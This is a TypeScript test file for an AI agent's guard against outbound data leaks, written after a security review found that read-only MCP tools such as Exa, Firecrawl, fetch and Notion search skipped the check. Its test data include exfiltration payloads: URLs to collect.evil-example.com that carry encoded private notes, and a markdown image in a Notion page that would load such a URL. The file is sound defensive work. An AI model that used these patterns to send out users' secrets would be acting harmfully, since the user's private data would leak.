import type { MonstersTool } from '@monsters/shared';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import { harnessToolForGuard } from '../src/agents/harness-hooks.ts';
import { classifyOutbound } from '../src/team/instinct/outbound.ts';
import { RunTaint } from '../src/team/instinct/taint.ts';

/*
 * Security review of 18/10, A1: the tools of other programs whose name reads
 * ("search", "fetch", "crawl", "scrape") or that the server marks read-only
 * skipped the data check. The reviewer's probe (`fork-agenti/mcp-args.ts`) is
 * the first case: the same content gave a card through `web_fetch` and null
 * through Exa, Firecrawl, `fetch` and `notion-search`.
 */

const PRIVATE =
  'Il codice della cassaforte di casa è 4471 e la chiave di riserva sta sotto il vaso blu del balcone';
const NOTE =
  'Il cliente Rossi paga ventimila euro per il progetto Alfa entro dicembre, contratto riservato con penale del dieci per cento in caso di ritardo sulla consegna finale';
const KEY = 'sk-or-v1-0123456789abcdef0123456789abcdef';

const tool = (name: string, extra: Partial<MonstersTool> = {}): MonstersTool => ({
  name,
  description: `[External tool, MCP server] ${name}`,
  inputSchema: z.any(),
  execute: () => Promise.resolve('ok'),
  ...extra,
});

function taintedRun(): RunTaint {
  const t = new RunTaint();
  t.sensitive(PRIVATE, 'private');
  t.sensitive(NOTE, 'note');
  t.taint('web_fetch https://hostile.example');
  return t;
}
/** The probe's own check (a word of the private note), and a registered key as the core has it. */
const probeSecret = (s: string) => s.includes('cassaforte');
const secret = (s: string) => s.includes(KEY);
const url = `https://collect.evil-example.com/?d=${encodeURIComponent(PRIVATE)}`;

const READS: [string, Record<string, unknown>, Partial<MonstersTool>][] = [
  ['mcp__exa__web_search_exa', { query: PRIVATE }, { readOnly: true }],
  ['mcp__exa__crawling_exa', { url }, { readOnly: true }],
  ['mcp__firecrawl__firecrawl_scrape', { url }, {}],
  ['mcp__firecrawl__firecrawl_scrape', { url }, { readOnly: true }],
  ['mcp__fetch__fetch', { url }, {}],
  ['mcp__notion__notion-search', { query: PRIVATE }, {}],
];

describe('A1 · the arguments of every call of another program are checked, reads included', () => {
  it('the probe: web_fetch was a card, the reads of other programs were null', () => {
    const t = taintedRun();
    expect(
      classifyOutbound(tool('web_fetch'), { url }, { taint: t, containsSecret: probeSecret }),
    ).toMatchObject({ certain: true, category: 'contact' });
    for (const [name, input, extra] of READS) {
      const found = classifyOutbound(tool(name, extra), input, {
        taint: t,
        containsSecret: probeSecret,
      });
      expect(found, name).toMatchObject({ certain: true, category: 'contact' });
      expect(found?.markOnly, name).toBeUndefined();
    }
  });

  it('a private note in a query is a card even without a registered key', () => {
    const found = classifyOutbound(
      tool('mcp__exa__web_search_exa', { readOnly: true }),
      { query: `cerca ${PRIVATE}` },
      { taint: taintedRun() },
    );
    expect(found).toMatchObject({ certain: true, category: 'contact' });
    expect(found?.summary).toContain('mandare a exa un pezzo di una tua nota privata');
  });

  it('a registered key in any argument is a card, also in a clean run', () => {
    const found = classifyOutbound(
      tool('mcp__notion__notion-search'),
      { query: 'progetti', filters: [{ text: `token ${KEY}` }] },
      { taint: new RunTaint(), containsSecret: secret },
    );
    expect(found).toMatchObject({ certain: true, category: 'contact' });
    expect(found?.summary).toContain('una delle tue chiavi');
  });

  it('an address with notes towards a site never seen, inside a text argument too', () => {
    const t = taintedRun();
    const leak = `https://collect.evil-example.com/r?d=${encodeURIComponent(NOTE)}`;
    expect(
      classifyOutbound(
        tool('mcp__firecrawl__firecrawl_scrape', { readOnly: true }),
        { url: leak },
        { taint: t },
      ),
    ).toMatchObject({ certain: true, category: 'contact' });
    // A page written to a service with an image that loads the notes (the service fetches it).
    expect(
      classifyOutbound(
        tool('mcp__notion__notion-create-pages'),
        { pages: [{ content: `# Report\n\n![](${leak})` }] },
        { taint: t },
      ),
    ).toMatchObject({ certain: true, category: 'contact' });
  });

  it('Claude Code: a service through Claude whose name reads is checked too', () => {
    const mapped = harnessToolForGuard(
      'mcp__claude_ai_Google_Drive__search_files',
      { query: PRIVATE },
      'monsters',
    )!;
    expect(mapped.tool.readOnly).toBe(true);
    expect(classifyOutbound(mapped.tool, mapped.input, { taint: taintedRun() })).toMatchObject({
      certain: true,
      category: 'contact',
    });
  });
});

describe('A1 · normal use asks nothing more', () => {
  it('notion-search with any query of the user in a clean run', () => {
    const t = new RunTaint();
    t.sensitive(PRIVATE, 'private');
    t.sensitive(NOTE, 'note');
    t.known('cerca su Notion il progetto Alfa e il contratto di Rossi');
    for (const query of [
      'progetto Alfa',
      'contratto Rossi penale ritardo consegna',
      PRIVATE,
      NOTE,
      'https://www.notion.so/Progetto-Alfa-0123456789abcdef',
    ]) {
      expect(
        classifyOutbound(
          tool('mcp__notion__notion-search'),
          { query },
          { taint: t, containsSecret: secret },
        ),
        query,
      ).toBeNull();
    }
  });

  it('searches and fetches of other programs in a tainted run, with ordinary arguments', () => {
    const t = taintedRun();
    t.observe('web_search', { query: 'ricette' }, [
      { url: 'https://www.giallozafferano.it/ricetta/x' },
    ]);
    const calls: [string, Record<string, unknown>, Partial<MonstersTool>][] = [
      [
        'mcp__exa__web_search_exa',
        { query: 'migliori ristoranti a Bologna', numResults: 5 },
        { readOnly: true },
      ],
      [
        'mcp__exa__crawling_exa',
        { url: 'https://www.giallozafferano.it/ricetta/x' },
        { readOnly: true },
      ],
      [
        'mcp__firecrawl__firecrawl_scrape',
        { url: 'https://example.org/blog/post', formats: ['markdown'] },
        { readOnly: true },
      ],
      ['mcp__notion__notion-search', { query: 'Rossi contratto' }, {}],
      [
        'mcp__notion__notion-fetch',
        { id: 'https://www.notion.so/Progetto-Alfa-0123456789abcdef' },
        {},
      ],
      // A note (not private) towards the user's own service: the service is theirs, like a search engine.
      ['mcp__exa__web_search_exa', { query: NOTE }, { readOnly: true }],
    ];
    for (const [name, input, extra] of calls) {
      expect(classifyOutbound(tool(name, extra), input, { taint: t }), name).toBeNull();
    }
  });

  it('the action of a write keeps deciding: a page in a clean run is a candidate, as before', () => {
    const found = classifyOutbound(
      tool('mcp__notion__notion-create-pages'),
      { pages: [{ content: NOTE }] },
      { taint: new RunTaint() },
    );
    expect(found).toMatchObject({ certain: false });
  });
});
